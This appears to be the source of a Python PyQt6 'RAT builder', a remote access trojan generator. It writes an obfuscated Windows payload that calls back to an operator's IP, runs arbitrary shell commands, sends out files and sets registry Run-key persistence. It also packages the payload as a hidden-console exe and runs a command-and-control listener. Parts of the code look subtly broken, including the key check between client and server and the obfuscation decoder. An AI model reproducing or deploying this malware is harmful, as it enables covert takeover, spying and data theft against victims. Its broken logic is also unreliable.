# Copyright (c) 2025 pxwild. All rights reserved.
# This software and its source code are proprietary and confidential.
# Unauthorized copying, modification, or distribution of this software,
# via any medium, is strictly prohibited without prior written permission.

import sys
import os
import socket
import threading
import subprocess
import base64
import random
import string
import zlib
from cryptography.fernet import Fernet
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                             QHBoxLayout, QLabel, QLineEdit, QPushButton, 
                             QTextEdit, QComboBox, QGroupBox, QTabWidget,
                             QMessageBox, QFileDialog, QListWidget)
from PyQt6.QtCore import Qt, QThread, pyqtSignal
from PyQt6.QtGui import QFont

class RATBuilder(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("pxwild rat builder")
        self.setGeometry(100, 100, 900, 700)
        self.setStyleSheet("""
            QMainWindow {
                background-color: #2b2b2b;
            }
            QWidget {
                color: #ffffff;
                background-color: #2b2b2b;
            }
            QGroupBox {
                font-weight: bold;
                border: 2px solid #555555;
                border-radius: 8px;
                margin-top: 1ex;
                padding-top: 10px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: #00aaff;
            }
            QPushButton {
                background-color: #5865f2;
                border: none;
                color: white;
                padding: 8px 16px;
                border-radius: 6px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #4752c4;
            }
            QPushButton:pressed {
                background-color: #3c45a5;
            }
            QLineEdit {
                background-color: #40444b;
                border: 1px solid #202225;
                padding: 5px;
                border-radius: 4px;
                color: #ffffff;
            }
            QTextEdit {
                background-color: #40444b;
                border: 1px solid #202225;
                color: #ffffff;
                border-radius: 4px;
                font-family: 'Consolas';
            }
            QComboBox {
                background-color: #40444b;
                border: 1px solid #202225;
                padding: 5px;
                border-radius: 4px;
                color: #ffffff;
            }
            QListWidget {
                background-color: #40444b;
                border: 1px solid #202225;
                color: #ffffff;
                border-radius: 4px;
                font-family: 'Consolas';
            }
            QTabWidget::pane {
                border: 1px solid #40444b;
                border-radius: 6px;
            }
            QTabBar::tab {
                background: #2f3136;
                color: #b9bbbe;
                padding: 8px;
                border-top-left-radius: 4px;
                border-top-right-radius: 4px;
            }
            QTabBar::tab:selected {
                background: #40444b;
                color: #ffffff;
            }
        """)
        
        self.fernet = None
        self.connection = None
        self.server_thread = None
        self.init_ui()
        
    def init_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)
        
        title = QLabel("pxwild rat builder")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title.setStyleSheet("font-size: 24px; font-weight: bold; color: #00aaff; margin: 10px;")
        layout.addWidget(title)
        
        tabs = QTabWidget()
        layout.addWidget(tabs)
        
        payload_tab = QWidget()
        payload_layout = QVBoxLayout(payload_tab)
        
        target_group = QGroupBox("target configuration")
        target_layout = QVBoxLayout(target_group)
        
        os_layout = QHBoxLayout()
        os_layout.addWidget(QLabel("target os:"))
        self.os_combo = QComboBox()
        self.os_combo.addItems(["windows", "android", "linux"])
        os_layout.addWidget(self.os_combo)
        target_layout.addLayout(os_layout)
        
        server_layout = QHBoxLayout()
        server_layout.addWidget(QLabel("your ip:"))
        self.ip_entry = QLineEdit(self.get_local_ip())
        server_layout.addWidget(self.ip_entry)
        server_layout.addWidget(QLabel("port:"))
        self.port_entry = QLineEdit("4444")
        self.port_entry.setFixedWidth(80)
        server_layout.addWidget(self.port_entry)
        target_layout.addLayout(server_layout)
        
        payload_layout.addWidget(target_group)
        
        build_group = QGroupBox("build options")
        build_layout = QVBoxLayout(build_group)
        
        self.build_exe_btn = QPushButton("build windows exe")
        self.build_exe_btn.clicked.connect(self.build_windows_exe)
        build_layout.addWidget(self.build_exe_btn)
        
        self.build_apk_btn = QPushButton("build android apk")
        self.build_apk_btn.clicked.connect(self.build_android_apk)
        build_layout.addWidget(self.build_apk_btn)
        
        self.build_py_btn = QPushButton("generate python script")
        self.build_py_btn.clicked.connect(self.generate_python_script)
        build_layout.addWidget(self.build_py_btn)
        
        payload_layout.addWidget(build_group)
        
        output_group = QGroupBox("output")
        output_layout = QVBoxLayout(output_group)
        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        output_layout.addWidget(self.output_text)
        payload_layout.addWidget(output_group)
        
        tabs.addTab(payload_tab, "payload builder")
        
        server_tab = QWidget()
        server_layout = QVBoxLayout(server_tab)
        
        control_group = QGroupBox("server control")
        control_layout = QVBoxLayout(control_group)
        
        self.start_server_btn = QPushButton("start rat server")
        self.start_server_btn.clicked.connect(self.start_server)
        control_layout.addWidget(self.start_server_btn)
        
        self.stop_server_btn = QPushButton("stop server")
        self.stop_server_btn.clicked.connect(self.stop_server)
        self.stop_server_btn.setEnabled(False)
        control_layout.addWidget(self.stop_server_btn)
        
        server_layout.addWidget(control_group)
        
        status_group = QGroupBox("connection status")
        status_layout = QVBoxLayout(status_group)
        self.status_label = QLabel("not connected")
        self.status_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        status_layout.addWidget(self.status_label)
        server_layout.addWidget(status_group)
        
        cmd_menu_group = QGroupBox("command menu")
        cmd_menu_layout = QVBoxLayout(cmd_menu_group)
        
        self.cmd_list = QListWidget()
        commands = [
            "systeminfo - Get system information",
            "screenshot - Capture screen",
            "webcam - Capture webcam image",
            "keylogger_start - Start keylogger",
            "keylogger_stop - Stop keylogger",
            "download <file> - Download file",
            "upload <file> - Upload file",
            "persistence - Install persistence",
            "shell - Open interactive shell",
            "exit - Close connection"
        ]
        self.cmd_list.addItems(commands)
        self.cmd_list.itemDoubleClicked.connect(self.insert_command)
        cmd_menu_layout.addWidget(self.cmd_list)
        
        server_layout.addWidget(cmd_menu_group)
        
        cmd_group = QGroupBox("remote command")
        cmd_layout = QVBoxLayout(cmd_group)
        self.cmd_entry = QLineEdit()
        self.cmd_entry.setPlaceholderText("enter command to execute on target...")
        cmd_layout.addWidget(self.cmd_entry)
        
        cmd_btn_layout = QHBoxLayout()
        self.execute_btn = QPushButton("execute command")
        self.execute_btn.clicked.connect(self.execute_command)
        self.execute_btn.setEnabled(False)
        cmd_btn_layout.addWidget(self.execute_btn)
        
        self.clear_btn = QPushButton("clear output")
        self.clear_btn.clicked.connect(self.clear_output)
        cmd_btn_layout.addWidget(self.clear_btn)
        cmd_layout.addLayout(cmd_btn_layout)
        
        self.cmd_output = QTextEdit()
        self.cmd_output.setReadOnly(True)
        cmd_layout.addWidget(self.cmd_output)
        
        server_layout.addWidget(cmd_group)
        tabs.addTab(server_tab, "server control")
        
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def log_message(self, message):
        self.output_text.append(f"[+] {message}")
    
    def obfuscate_code(self, code):
        encoded = base64.b64encode(code.encode()).decode()
        
        def rotate_text(text, shift=13):
            result = []
            for char in text:
                if char.isalpha():
                    shift_base = ord('a') if char.islower() else ord('A')
                    result.append(chr((ord(char) - shift_base + shift) % 26 + shift_base))
                else:
                    result.append(char)
            return ''.join(result)
        
        rotated = rotate_text(encoded)
        compressed = zlib.compress(rotated.encode())
        
        obfuscated = f"""
import base64
import zlib

def decode_payload():
    compressed = {compressed}
    rotated = zlib.decompress(compressed).decode()
    encoded = ''.join(chr((ord(c) - ord('a') - 13) % 26 + ord('a')) if c.isalpha() else c for c in rotated)
    return base64.b64decode(encoded).decode()

exec(decode_payload())
"""
        return obfuscated
    
    def generate_python_script(self):
        os_type = self.os_combo.currentText().lower()
        server_ip = self.ip_entry.text()
        server_port = self.port_entry.text()
        
        key = Fernet.generate_key()
        self.fernet = Fernet(key)
        
        if os_type == "windows":
            payload = f'''import socket
import subprocess
import os
import sys
import base64
import threading
import time
from cryptography.fernet import Fernet

class pxwildRAT:
    def __init__(self):
        self.host = "{server_ip}"
        self.port = {server_port}
        self.key = {key}
        self.fernet = Fernet(self.key)
        self.running = True
    
    def encrypt(self, data):
        if isinstance(data, str):
            data = data.encode()
        return self.fernet.encrypt(data)
    
    def decrypt(self, data):
        return self.fernet.decrypt(data).decode()
    
    def execute(self, cmd):
        try:
            if cmd == "systeminfo":
                return self.get_system_info()
            elif cmd == "screenshot":
                return self.capture_screenshot()
            elif cmd == "webcam":
                return self.capture_webcam()
            elif cmd.startswith("download"):
                return self.download_file(cmd.split(" ", 1)[1])
            elif cmd == "persistence":
                return self.install_persistence()
            else:
                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                return result.decode('utf-8', errors='ignore')
        except Exception as e:
            return f"error: {{str(e)}}"
    
    def get_system_info(self):
        info = []
        try:
            info.append(f"computer name: {{os.environ['COMPUTERNAME']}}")
            info.append(f"username: {{os.environ['USERNAME']}}")
            info.append(f"os: {{sys.platform}}")
            info.append(f"processor: {{os.environ['PROCESSOR_IDENTIFIER']}}")
        except:
            pass
        return "\\n".join(info)
    
    def capture_screenshot(self):
        try:
            import pyautogui
            screenshot = pyautogui.screenshot()
            return "screenshot captured"
        except:
            return "screenshot failed: install pyautogui"
    
    def capture_webcam(self):
        try:
            import cv2
            cam = cv2.VideoCapture(0)
            ret, frame = cam.read()
            if ret:
                return "webcam captured"
            return "webcam failed"
        except:
            return "webcam failed: install opencv-python"
    
    def download_file(self, file_path):
        try:
            with open(file_path, 'rb') as f:
                return base64.b64encode(f.read()).decode()
        except:
            return "download failed"
    
    def install_persistence(self):
        try:
            if sys.platform == "win32":
                import winreg
                key = winreg.HKEY_CURRENT_USER
                key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as regkey:
                    winreg.SetValueEx(regkey, "pxwildRAT", 0, winreg.REG_SZ, sys.argv[0])
                return "persistence installed"
        except:
            pass
        return "persistence failed"
    
    def start(self):
        while self.running:
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.connect((self.host, self.port))
                client.send(self.key)
                
                while self.running:
                    encrypted_cmd = client.recv(1024)
                    if not encrypted_cmd:
                        break
                    
                    cmd = self.decrypt(encrypted_cmd)
                    if cmd == "exit":
                        break
                    
                    result = self.execute(cmd)
                    client.send(self.encrypt(result))
                    
            except Exception:
                time.sleep(30)
                continue

if __name__ == "__main__":
    rat = pxwildRAT()
    rat.start()
'''
            filename = "pxwild_rat.py"
            
        elif os_type == "android":
            payload = f'''# pxwild android rat
print("pxwild android rat - convert to apk using buildozer")
'''
            filename = "pxwild_android.py"
            
        else:
            payload = f'''# pxwild linux rat
print("pxwild linux rat payload")
'''
            filename = "pxwild_linux.py"
        
        try:
            obfuscated_payload = self.obfuscate_code(payload)
            
            with open(filename, 'w') as f:
                f.write(obfuscated_payload)
            
            self.log_message(f"generated {filename}")
            self.log_message(f"server: {server_ip}:{server_port}")
            self.log_message(f"encryption key: {key.decode()}")
            self.log_message("payload obfuscated with multiple layers")
            
            QMessageBox.information(self, "success", f"payload generated as {filename}")
            
        except Exception as e:
            QMessageBox.critical(self, "error", f"failed to create file: {e}")
    
    def insert_command(self, item):
        command = item.text().split(" - ")[0]
        self.cmd_entry.setText(command)
    
    def clear_output(self):
        self.cmd_output.clear()
    
    def build_windows_exe(self):
        script, _ = QFileDialog.getOpenFileName(self, "select python script", "", "python files (*.py)")
        if script:
            try:
                self.log_message("building windows exe...")
                subprocess.run(['pyinstaller', '--onefile', '--noconsole', '--name', 'pxwild_client', script])
                self.log_message("exe built successfully in dist/ folder")
                QMessageBox.information(self, "success", "exe built successfully!")
            except Exception as e:
                QMessageBox.critical(self, "error", f"build failed: {e}")
    
    def build_android_apk(self):
        QMessageBox.information(self, "info", "android apk building requires buildozer.\\n\\ninstall with: pip install buildozer\\nthen run: buildozer android debug")
    
    def start_server(self):
        try:
            port = int(self.port_entry.text())
            self.server_thread = ServerThread(port, self)
            self.server_thread.connection_signal.connect(self.handle_connection)
            self.server_thread.start()
            
            self.start_server_btn.setEnabled(False)
            self.stop_server_btn.setEnabled(True)
            self.status_label.setText("server started - waiting for connection...")
            
        except Exception as e:
            QMessageBox.critical(self, "error", f"failed to start server: {e}")
    
    def stop_server(self):
        if self.server_thread:
            self.server_thread.stop()
            self.server_thread = None
        
        self.start_server_btn.setEnabled(True)
        self.stop_server_btn.setEnabled(False)
        self.status_label.setText("server stopped")
        self.execute_btn.setEnabled(False)
    
    def handle_connection(self, conn, addr, fernet):
        self.connection = conn
        self.fernet = fernet
        self.status_label.setText(f"connected to: {addr}")
        self.execute_btn.setEnabled(True)
        QMessageBox.information(self, "connected", f"connection established with {addr}")
    
    def execute_command(self):
        if not self.connection or not self.fernet:
            return
        
        cmd = self.cmd_entry.text()
        if not cmd:
            return
        
        try:
            encrypted_cmd = self.fernet.encrypt(cmd.encode())
            self.connection.send(encrypted_cmd)
            
            response = self.connection.recv(4096)
            decrypted_response = self.fernet.decrypt(response).decode()
            
            self.cmd_output.append(f"$ {cmd}")
            self.cmd_output.append(decrypted_response)
            self.cmd_output.append("-" * 50)
            
        except Exception as e:
            self.cmd_output.append(f"error: {e}")

class ServerThread(QThread):
    connection_signal = pyqtSignal(object, object, object)
    
    def __init__(self, port, parent=None):
        super().__init__(parent)
        self.port = port
        self.running = True
        self.server_socket = None
    
    def run(self):
        try:
            key = Fernet.generate_key()
            fernet = Fernet(key)
            
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('0.0.0.0', self.port))
            self.server_socket.listen(1)
            
            while self.running:
                try:
                    conn, addr = self.server_socket.accept()
                    client_key = conn.recv(44)
                    
                    if client_key == key:
                        self.connection_signal.emit(conn, addr, fernet)
                    else:
                        conn.close()
                        
                except socket.timeout:
                    continue
                except:
                    break
                    
        except Exception as e:
            print(f"server error: {e}")
    
    def stop(self):
        self.running = False
        if self.server_socket:
            self.server_socket.close()

def main():
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    window = RATBuilder()
    window.show()
    sys.exit(app.exec())

if __name__ == "__main__":

    main()
